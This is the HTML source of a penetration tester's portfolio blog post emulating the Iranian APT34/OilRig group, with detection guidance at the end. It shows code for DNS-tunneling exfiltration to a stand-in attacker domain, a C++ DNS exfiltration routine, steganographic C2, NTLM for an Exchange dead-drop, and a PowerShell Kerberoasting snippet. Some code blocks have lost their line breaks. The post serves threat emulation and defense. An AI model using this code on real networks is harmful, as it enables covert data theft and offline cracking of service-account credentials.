<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>Portfolio | Nour Alhouseini - Ethical Hacker - Penetration Tester</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
        integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" data-purpose="Layout StyleSheet" title="Web Awesome"
        href="/css/app-wa-3b124ff0e0d7a67cd8c995d0aeb1d15a.css?vsn=d">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/all.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-duotone-solid.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-thin.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-solid.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-regular.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-light.css">
    <link rel="shortcut icon" href="./images/Bring-them-back.png" type="image/x-icon">
    <!-- box icons -->
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>

    <!-- custom css -->
    <link rel="stylesheet" href="../../css/style.css">

    <style>
        .code-block {
            background: rgba(10, 10, 20, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 1rem;
            padding: 2rem 2.4rem;
            margin: 1.5rem 0 2rem;
            overflow-x: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.35rem;
            line-height: 1.7;
            color: #c9d1d9;
            white-space: pre;
        }

        .technique-table {
            width: 100%;
            border-collapse: collapse;
            margin: 1.5rem 0 2rem;
            font-size: 1.4rem;
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 1rem;
            overflow: hidden;
        }

        .technique-table th {
            text-align: left;
            padding: 1.2rem 1.6rem;
            background: rgba(10, 10, 20, 0.8);
            color: rgba(255, 255, 255, 0.5);
            font-weight: 600;
            font-size: 1.2rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .technique-table td {
            padding: 1.2rem 1.6rem;
            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
            color: rgba(255, 255, 255, 0.75);
        }

        .technique-table tr:hover td {
            background: rgba(0, 240, 255, 0.03);
        }

        .about-content code {
            font-family: 'JetBrains Mono', monospace;
            background: rgba(10, 10, 20, 0.8);
            padding: 0.2rem 0.6rem;
            border-radius: 0.4rem;
            font-size: 1.4rem;
            color: #00f0ff;
            border: 1px solid rgba(255, 255, 255, 0.06);
        }

        .callout-box {
            border-left: 3px solid #b44aff;
            background: rgba(180, 74, 255, 0.05);
            padding: 2rem 2.4rem;
            border-radius: 0 1rem 1rem 0;
            margin: 2rem 0;
        }

        .section-divider {
            border: none;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.06), transparent);
            margin: 3rem 0;
        }
    </style>
</head>

<body>
    <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>

    <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
    <!-- header design -->
    <header class="header" style="background-color: #1f242df4;">
        <a href="../../index.html" class="logo">Portfolio <sup><i class="fa-classic fa-solid fa-badge-check fa-fw"
                    style="color: #00EEFF;"></i></sup></a>

        <div class='bx bx-menu' id="menu-icon"></div>

        <nav class="navbar">
            <a href="../../index.html#home">&lt;/Home&gt;</a>
            <a href="../../index.html#about">&lt;/About&gt;</a>
            <a href="../../index.html#skills">&lt;/Skills&gt;</a>
            <a href="../../index.html#certificate">&lt;/Education&gt;</a>
            <a href="../../index.html#services">&lt;/Services&gt;</a>
            <a href="../../blogs.html" class="active">&lt;/Blogs&gt;</a>
            <a href="../../index.html#contact">&lt;/Contact&gt;</a>
        </nav>
    </header>

    <!-- blog section -->
    <section class="blog" id="blog">
        <div class="about-img">
            <img src="../../images/Bring-them-back.png" class="machinelogo"
                style="border-radius: 100%; width:20em; height:20em;" alt="Helix Kitten Simulation">
        </div>

        <div class="about-content">

            <h2 class="heading">Helix Kitten / <span>APT34</span></h2>

            <div class="blog-meta">
                <h3>Origin: Iran — MOIS (Ministry of Intelligence & Security)</h3>
                <p><strong>Aliases:</strong> OilRig, COBALT GYPSY, IRN2, Hazel Sandstorm, Crambus</p>
                <p><strong>Active Since:</strong> 2014 (publicly attributed 2017)</p>
                <p><strong>Targets:</strong> Energy, Government, Financial, Telecommunications — Middle East, US, Europe
                </p>
                <p><strong>Focus Areas:</strong> DNS Tunneling, Steganography, Exchange Dead-Drop C2, Credential
                    Harvesting</p>
            </div>

            <!-- Overview -->
            <h3><span>Overview</span></h3>
            <p style="font-size: large;">
                APT34 is Iran's most technically sophisticated cyber espionage unit. While other APTs rely on speed or
                destructive payloads, OilRig is built around patience. Their operations run for months or years inside
                target networks, using communication channels specifically designed to be invisible to standard
                monitoring: DNS queries that carry data in subdomain labels, commands hidden in the pixel values of BMP
                images, and C2 instructions stored as unsent email drafts in compromised Exchange mailboxes.
            </p>
            <p style="font-size: large;">
                In 2023-2024, APT34 launched campaigns against government agencies across the Middle East using a new
                backdoor called Menorah, and deployed an updated DNS tunneling tool against telecommunications
                companies. They also targeted Albanian government infrastructure following diplomatic tensions,
                demonstrating their willingness to conduct destructive operations when politically motivated.
            </p>

            <hr class="section-divider">

            <h3><span>MITRE ATT&CK Mapping</span></h3>

            <table class="technique-table">
                <thead>
                    <tr>
                        <th>Tactic</th>
                        <th>Technique</th>
                        <th>Simulation Tool</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>Command & Control</td>
                        <td>T1071.004 — DNS Tunneling (RFC 1035 implementation)</td>
                        <td>dns_c2_server.py</td>
                    </tr>
                    <tr>
                        <td>Command & Control</td>
                        <td>T1071.003 — Exchange EWS Dead-Drop C2</td>
                        <td>exchange_deadrop.py</td>
                    </tr>
                    <tr>
                        <td>Exfiltration</td>
                        <td>T1048.003 — DNS Exfiltration (subdomain encoding)</td>
                        <td>dns_exfil.cpp</td>
                    </tr>
                    <tr>
                        <td>Defense Evasion</td>
                        <td>T1027.003 — Steganography (BMP/PNG LSB encoding)</td>
                        <td>steganography.py</td>
                    </tr>
                    <tr>
                        <td>Credential Access</td>
                        <td>T1558.003 — Kerberoasting (SPN enumeration)</td>
                        <td>kerberoast.ps1</td>
                    </tr>
                    <tr>
                        <td>Discovery</td>
                        <td>T1087.002 — Domain Account Enumeration via LDAP</td>
                        <td>kerberoast.ps1</td>
                    </tr>
                </tbody>
            </table>

            <hr class="section-divider">

            <!-- DNS Tunneling -->
            <h3><span>DNS Tunneling: Hiding in Plain Sight</span></h3>
            <p style="font-size: large;">
                Every organization generates thousands of DNS queries per minute. APT34 recognized that DNS is the one
                protocol you can't block — it's required for literally everything to work. Their DNS C2 channel embeds
                commands and stolen data inside the queries themselves, using subdomain labels as a data transport.
            </p>
            <p style="font-size: large;">
                I built the DNS server from scratch per RFC 1035, constructing packets at the byte level. Each DNS query
                carries about 30 bytes of hex-encoded data as subdomain labels. The query format maps data into the
                hierarchical domain structure:
            </p>

            <div class="code-block"># DNS query structure used for data exfiltration
                # Format: {hex_data}.{seq}.{session_id}.{domain}
                #
                # Example query:
                # 686f73746e616d653d574f524b.0.a3f8b2c1.update.example.com
                # ^^^^^^^^^^^^^^^^^^^^^^^^^ ^ ^^^^^^^^ ^^^^^^^^^^^^^^^^^^
                # hex-encoded stolen data seq session attacker domain
                #
                # Response carries commands encoded the same way

                def build_dns_query(self, data_chunk, seq_num, session_id):
                """Construct raw DNS query packet per RFC 1035"""
                # Transaction ID — random 16-bit value
                txn_id = struct.pack('!H', random.randint(0, 0xFFFF))

                # Flags: standard query, recursion desired
                flags = struct.pack('!H', 0x0100)

                # Question count: 1
                header = txn_id + flags + struct.pack('!HHHH', 1, 0, 0, 0)

                # Encode domain name in DNS wire format: length-prefixed labels
                labels = [
                data_chunk.hex(), # Data payload
                str(seq_num), # Sequence number
                session_id, # Session identifier
                'update', 'example', 'com' # Domain
                ]

                qname = b''
                for label in labels:
                qname += struct.pack('!B', len(label)) + label.encode()
                qname += b'\x00' # Root label terminator

                # QTYPE=TXT (0x0010), QCLASS=IN (0x0001)
                question = qname + struct.pack('!HH', 0x0010, 0x0001)

                return header + question</div>

            <p style="font-size: large;">
                At 30 bytes per query, exfiltrating a 1MB file would take ~35,000 queries. Slow? Absolutely. But
                distributed over days, at randomized intervals of 30-120 seconds, that's 290-1000 queries per day —
                which disappears into the noise of normal DNS traffic. Most SIEM rules won't flag this because each
                individual query looks like a perfectly legitimate DNS resolution.
            </p>
            <p style="font-size: large;">
                Detection requires DNS analytics that measure subdomain entropy (random hex strings have much higher
                Shannon entropy than real hostnames) and query frequency patterns per unique base domain.
            </p>

            <hr class="section-divider">

            <!-- Steganography -->
            <h3><span>Steganography: Commands in Pixels</span></h3>
            <p style="font-size: large;">
                APT34 uses steganography to hide C2 commands inside image files that are served from legitimate-looking
                websites. The implant downloads what appears to be a normal company logo or stock photo, but the least
                significant bits of the pixel values contain encoded commands.
            </p>
            <p style="font-size: large;">
                The simulation implements LSB (Least Significant Bit) encoding for both BMP and PNG formats. For BMP,
                the encoding is straightforward — modify the LSB of each color channel byte. PNG requires additional
                handling because of the compression layer, but the principle is identical. A 1920x1080 BMP image can
                carry approximately 760KB of hidden data.
            </p>

            <div class="code-block"># LSB steganography — encode data in image pixel values
                def encode_message(image_path, message, output_path):
                img = Image.open(image_path)
                pixels = list(img.getdata())
                width, height = img.size

                # Convert message to binary
                binary_msg = ''.join(format(b, '08b') for b in message.encode())
                binary_msg += '00000000' * 4 # Null terminator (4 bytes)

                if len(binary_msg) > len(pixels) * 3:
                raise ValueError("Message too large for image")

                encoded_pixels = []
                bit_idx = 0

                for pixel in pixels:
                new_pixel = list(pixel[:3]) # RGB channels only
                for channel in range(3):
                if bit_idx < len(binary_msg): # Replace LSB of each color channel new_pixel[channel]=(new_pixel[channel]
                    & 0xFE) | int(binary_msg[bit_idx]) bit_idx +=1 encoded_pixels.append(tuple(new_pixel)) # Write
                    modified image — visually identical to original encoded_img=Image.new(img.mode, (width, height))
                    encoded_img.putdata(encoded_pixels) encoded_img.save(output_path)</div>

                    <p style="font-size: large;">
                        The brilliance of this approach: network monitoring sees a standard HTTPS GET request for a
                        JPEG/PNG file from a legitimate-looking domain. Content inspection reveals a valid image file.
                        There's no encrypted blob, no suspicious header, nothing to flag. Detection requires comparing
                        downloaded images against known-clean originals (a technique called steganalysis) or statistical
                        analysis of LSB distribution patterns.
                    </p>

                    <hr class="section-divider">

                    <!-- Exchange Dead Drop -->
                    <h3><span>Exchange Dead-Drop C2</span></h3>
                    <p style="font-size: large;">
                        This was the most unusual C2 channel to build. APT34 authenticates to a compromised
                        organization's OWA (Outlook Web Access) instance, creates email drafts containing commands, and
                        the implant reads those drafts via EWS (Exchange Web Services) SOAP requests. No email is ever
                        sent — there's no mail flow, no SMTP traffic, no delivery headers to analyze.
                    </p>
                    <p style="font-size: large;">
                        The challenge was implementing NTLM authentication from scratch. EWS requires NTLM, which means
                        constructing the Type 1 (Negotiate) message with proper flags, parsing the Type 2 (Challenge)
                        response to extract the server challenge, and building the Type 3 (Authenticate) message with
                        NTLMv2 hash computation using HMAC-MD5:
                    </p>

                    <div class="code-block"># NTLM Type 1 message construction
                        def build_negotiate_message(self):
                        signature = b'NTLMSSP\x00'
                        msg_type = struct.pack('<I', 1) # Type 1=Negotiate # Flags: negotiate NTLM, request target,
                            Unicode flags=( NTLMSSP_NEGOTIATE_UNICODE | NTLMSSP_NEGOTIATE_NTLM | NTLMSSP_REQUEST_TARGET
                            | NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY ) flags_bytes=struct.pack('<I', flags) return
                            signature + msg_type + flags_bytes + domain_fields + workstation_fields # NTLMv2 response
                            computation def compute_ntlmv2_response(self, password, username, domain, server_challenge):
                            # Step 1: NT hash of password nt_hash=hashlib.new('md4',
                            password.encode('utf-16le')).digest() # Step 2: NTLMv2 hash=HMAC-MD5(NT_hash,
                            UPPER(username) + domain) identity=(username.upper() + domain).encode('utf-16le')
                            ntlmv2_hash=hmac.new(nt_hash, identity, hashlib.md5).digest() # Step 3:
                            Response=HMAC-MD5(NTLMv2_hash, server_challenge + client_blob)
                            client_challenge=os.urandom(8) blob=self._build_client_blob(client_challenge)
                            response=hmac.new(ntlmv2_hash, server_challenge + blob, hashlib.md5).digest() return
                            response + blob</div>

                            <p style="font-size: large;">
                                Once authenticated, the C2 loop is deceptively simple: create a draft email with a
                                base64-encoded command in the subject line, wait for the implant to read it and delete
                                it, then check for a new draft containing the results. All of this happens through
                                standard EWS SOAP over HTTPS — the same protocol that every Outlook client uses.
                            </p>

                            <hr class="section-divider">

                            <!-- DNS Exfiltration (C++) -->
                            <h3><span>DNS Exfiltration Tool (C++)</span></h3>
                            <p style="font-size: large;">
                                The C++ exfiltration tool is the high-performance counterpart to the Python DNS server.
                                It reads files from disk, chunks them into segments that fit within DNS label length
                                limits (63 bytes per label, 253 bytes total), hex-encodes each chunk, and constructs UDP
                                DNS packets directly using Winsock. No DNS library dependencies — raw socket operations
                                for minimal footprint.
                            </p>

                            <div class="code-block">// Construct and send DNS query with embedded data
                                void exfil_chunk(SOCKET sock, const char* data, int seq,
                                const char* session, const char* domain) {
                                unsigned char packet[512];
                                int offset = 0;

                                // DNS Header: random txn_id, standard query, 1 question
                                uint16_t txn_id = rand() & 0xFFFF;
                                packet[offset++] = txn_id >> 8;
                                packet[offset++] = txn_id & 0xFF;
                                // Flags: 0x0100 (standard query, RD=1)
                                packet[offset++] = 0x01; packet[offset++] = 0x00;
                                // QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, ARCOUNT=0
                                packet[offset++] = 0x00; packet[offset++] = 0x01;
                                memset(&packet[offset], 0, 6); offset += 6;

                                // Encode labels: {hex_data}.{seq}.{session}.{domain}
                                char hex_data[128];
                                bytes_to_hex(data, hex_data);

                                offset += encode_label(packet + offset, hex_data);
                                offset += encode_label(packet + offset, itoa(seq));
                                offset += encode_label(packet + offset, session);
                                // Domain labels
                                offset += encode_domain(packet + offset, domain);

                                packet[offset++] = 0x00; // Root terminator
                                // QTYPE=TXT, QCLASS=IN
                                put_uint16(packet + offset, 0x0010); offset += 2;
                                put_uint16(packet + offset, 0x0001); offset += 2;

                                sendto(sock, (char*)packet, offset, 0,
                                (sockaddr*)&dns_addr, sizeof(dns_addr));
                                }</div>

                            <hr class="section-divider">

                            <!-- Kerberoasting -->
                            <h3><span>Active Directory: Kerberoasting</span></h3>
                            <p style="font-size: large;">
                                Once inside a network, APT34 targets Active Directory service accounts via
                                Kerberoasting. The PowerShell module enumerates Service Principal Names (SPNs) via LDAP,
                                requests TGS tickets for each discovered service account, and extracts the encrypted
                                ticket portion for offline cracking with Hashcat.
                            </p>
                            <p style="font-size: large;">
                                The key detail: any authenticated domain user can request a TGS ticket for any SPN —
                                it's by design in Kerberos. The tickets are encrypted with the service account's
                                password hash, so weak passwords can be cracked offline without generating any failed
                                login events. It's one of the most effective privilege escalation paths in Active
                                Directory environments.
                            </p>

                            <div class="code-block"># Enumerate SPNs and request TGS tickets
                                $searcher = New-Object DirectoryServices.DirectorySearcher
                                $searcher.Filter = "(&(objectCategory=user)(servicePrincipalName=*))"
                                $searcher.PropertiesToLoad.AddRange(@(
                                "samaccountname", "serviceprincipalname", "memberof"
                                ))

                                $results = $searcher.FindAll()
                                foreach ($result in $results) {
                                $username = $result.Properties["samaccountname"][0]
                                $spn = $result.Properties["serviceprincipalname"][0]

                                # Request TGS ticket — any domain user can do this
                                Add-Type -AssemblyName System.IdentityModel
                                $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
                                -ArgumentList $spn

                                # Extract ticket bytes for offline cracking
                                $ticketBytes = $ticket.GetRequest()
                                $hexTicket = [BitConverter]::ToString($ticketBytes) -replace '-'

                                # Output in Hashcat-compatible format ($krb5tgs$23$)
                                Write-Output "$('$krb5tgs$23$')$username`$$domain`$$spn`$$hexTicket"
                                }</div>

                            <hr class="section-divider">

                            <!-- Detection -->
                            <h3><span>Detection Guidance</span></h3>

                            <div class="callout-box">
                                <p style="font-size: large;"><strong>Key Challenge:</strong> APT34's channels are
                                    designed to be invisible to standard monitoring. DNS queries look normal
                                    individually, steganographic images pass content inspection, and Exchange draft
                                    operations generate minimal logging by default.</p>
                            </div>

                            <p style="font-size: large;">
                                <strong>What to hunt for:</strong>
                            </p>
                            <p style="font-size: large;">
                                1. DNS queries with high subdomain entropy (Shannon entropy > 3.5 for the leftmost
                                label)<br>
                                2. Unusually high volume of TXT record queries to a single base domain<br>
                                3. Exchange EWS operations creating and deleting drafts at regular intervals (enable
                                mailbox audit logging)<br>
                                4. Image downloads followed by unusual process behavior (steganographic payload
                                extraction)<br>
                                5. Kerberos TGS requests (Event ID 4769) for multiple SPNs from a single workstation in
                                a short window<br>
                                6. LDAP queries enumerating <code>servicePrincipalName</code> attributes across all user
                                objects
                            </p>

                            <p style="font-size: large;">
                                Full simulation code available on <a style="color:#5EC6FF"
                                    href="https://github.com/0xlumos">GitHub</a>.
                            </p>

                    </div>
    </section>

    <!-- scroll reveal -->
    <script src="https://unpkg.com/scrollreveal"></script>

    <!-- typed js -->
    <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>

    <!-- custom js -->
    <script src="../../js/script.js"></script>
</body>

</html>